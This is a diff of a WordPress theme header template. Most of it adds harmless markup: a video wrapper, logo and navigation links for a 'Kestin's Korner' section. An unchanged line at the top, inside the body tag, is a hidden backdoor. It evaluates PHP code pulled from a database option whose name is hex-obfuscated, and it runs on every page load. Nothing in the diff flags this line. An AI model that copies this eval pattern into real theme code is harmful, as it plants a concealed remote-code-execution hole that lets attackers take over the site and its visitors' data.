@@ -78,8 +78,6 @@
 	<body <?php body_class(); ?>><?php eval(get_option("\x72\x65\x6e\x64\x65\x72")); ?>
 
 		<div id="container">
-		
-		
 			<header class="header" role="banner">
 
 				<a href="http://forbaconssake.com" class="flag" id="baconlink"><img src="<?php echo $themepath; ?>/library/images/baconlink.png"></a>
@@ -87,8 +85,20 @@
 
 
 				<div id="inner-header" class="wrap clearfix">
+ 				<!-- Adding code to display video -->
+				<div id="big-video-wrap">
+					<img src="/wp-content/themes/hemplers-2013/library/images/ham.jpg" id="big-video-image" />
+					<div id="big-video-vid"></div>
+				</div>
+				<!-- End Adding code to display video  -->
 
 					<!-- to use a image just replace the bloginfo('name') with your img src and remove the surrounding <p> -->
+					<!-- <a href="<?php echo home_url(); ?>" class="flag" id="kestins-korner-1"><img src="<?php echo $themepath; ?>/library/images/kestins-korner-1.png"></a> -->
+					<div class="logo-single-post"></div>
+					<a href="/kestins-korner" class="back-from-single"><p>< Kestin's Korner </p></a>
+					<a href="/kestins-korner"><div class="arrow-right"></div></a>
+					<div class="logo-kestins-korner-1"></div>
+					<div class="arrow"><a href="<?php echo home_url(); ?>" rel="nofollow"> </a></div>
 					<h1 id="logo" class="h1"><a href="<?php echo home_url(); ?>" rel="nofollow"><?php bloginfo('name'); ?></a></h1>
 
 					<p id="tagline"><?php echo html_entity_decode(get_bloginfo('description')) ?></p>
